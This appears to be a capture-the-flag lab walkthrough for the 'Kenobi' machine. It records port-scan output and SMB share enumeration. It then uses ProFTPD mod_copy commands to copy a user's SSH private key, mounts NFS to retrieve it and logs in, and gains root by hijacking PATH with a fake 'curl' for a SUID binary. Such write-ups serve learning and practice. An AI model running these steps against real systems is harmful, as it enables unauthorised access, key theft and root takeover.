## Recon
- PORT     STATE SERVICE     VERSION
	21/tcp   open  ftp         ProFTPD 1.3.5
	22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   3072 a9:be:f3:47:30:92:64:41:e7:c4:ec:0b:a9:ad:2d:23 (RSA)
		|   256 c8:b1:e1:d6:39:ec:ea:47:9e:3a:dd:d7:7e:2a:80:f1 (ECDSA)
		|_  256 31:cf:37:df:47:06:5e:e8:ef:9c:2a:65:55:79:d2:3d (ED25519)
	80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
		|_http-title: Site doesn't have a title (text/html).
		|_http-server-header: Apache/2.4.41 (Ubuntu)
		| http-robots.txt: 1 disallowed entry 
		|_/admin.html
	139/tcp  open  netbios-ssn Samba smbd 4
	445/tcp  open  netbios-ssn Samba smbd 4
	2049/tcp open  nfs         3-4 (RPC #100003)
	Device type: general purpose|phone
		Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
		OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
		Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
		No exact OS matches for host (test conditions non-ideal).
		Network Distance: 3 hops
		Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	 - SMB Detected (versions: 2, 3) (preferred dialect: SMB 3.1.1) 
## Gaining Access 
- A script to enumerate scripts: 
	- nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.66.164.146. 
- Always try smbclient:
	- smbclient //10.66.164.146/anonymous
 	 Password for [WORKGROUP\mara]:
	 Try "help" to get a list of possible commands.
	 smb: \> 
	- You can get file by , get file.txt
	- The Proftpd's mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
		- SITE CPFR /home/kenobi/.ssh/id_rsa
		- SITE CPTO /var/tmp/id_rsa
	- Lets mount the /var/tmp directory to our machine
		mkdir /mnt/kenobi
		mount MACHINE_IP:/var /mnt/kenobi
- We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
	- cp /mnt/kenobi/tmp/id_rsa .
	- chmod 600 id_rsa
	- ssh -i id_rsa kenobi@Machine_IP.
## Privilege Escalation 
- We can start with LinPEAS the goal of this script is to search for possible **Privilege Escalation Paths**.
- we will find an unusual file /usr/bin/menu.
- As this file runs as the root users privileges, we can manipulate our path gain a root shell.
	- echo /bin/sh > curl 
	- chmod 777 curl
	- export PATH=/tmp:$PATH <- not recommanded
	- /usr/bin/menu
- We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root.